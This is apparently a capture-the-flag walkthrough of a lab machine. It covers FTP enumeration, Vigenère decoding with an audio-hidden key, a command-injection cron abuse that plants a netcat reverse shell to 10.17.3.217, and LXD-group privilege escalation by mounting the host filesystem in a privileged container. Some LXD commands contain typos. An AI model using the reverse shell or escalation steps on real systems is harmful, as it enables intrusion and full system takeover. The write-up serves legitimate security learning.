    Enumeration¶

    Initially, I enumerated the FTP service at port 21 with anonymous login and discovered the dad_tasks file, which appeared as gibberish after decoding with base64. 

    cat dad_tasks | base64 --decode

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl

    I realized that there may be further decoding processes required with other findings during enumeration. so I held up.

    Next, I proceeded to enumerate the website on port 80 and discovered the user weston. Upon navigating through the hidden folders, I found several directories, including auditions, contracts, and scripts.

    Initial Access¶

    While exploring auditions, I found an .mp3 file.

    Tips & Tricks

    When you find a suspicious image file, audio file or video file, It is always good practice to perform stegnography checks.

    I found a crucial keyword hidden within the audio file, which I later mapped to the decoded text. Using the Vigenere decoding option in CyberChef, I decoded the message successfully.

    It turned out to be none other than the SSH credentials for weston.

    Using these credentials, I logged in as weston and executed the id command, which revealed that weston belongs to the cage group.

    uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)

    I also received strange popup messages from the terminal, indicating the presence of a running cron job but actually didn't.

    #!/usr/bin/env python

import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

    I overwrote the quote variable in the /opt/.dads_scripts/.files/.quotes directory with a reverse shell command. 

    echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5432 >/tmp/f" > /opt/.dads_scripts/.files/.quotes

    Within three minutes, I obtained a reverse shell for cage.

    Although I attempted to stabilize the shell, it did not respond for some reason. Further attempts to establish a meterpreter session also failed. Therefore, I accessed the SSH using the private key found in the .ssh folder.

    Upon obtaining access, I found the first flag in the Super-Duper-checklist.

    Gaining root access¶

    Typing the id command again revealed that the cage account belonged to the LXD group. I then performed a common exploit for this group and achieved root access.

    # Clone https://github.com/saghul/lxd-alpine-builder.git

# Run this
cd lxd-alphine-bulder
./build-alphine

# Transfer the file to victim machine

# Add the image to victims lxd container
lxc image import ./apline-v3.10-x86_6420191008_1227.tar.gz  alias myimage

# Initialise and mount:
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

    More Info

    More information can be found on LXD Privilege Escalation as this blog is not intended for explaining this method in detail.

    Although I initially struggled to locate the root.txt file, I eventually found it in the /mnt/root/root folder and successfully completed the room.
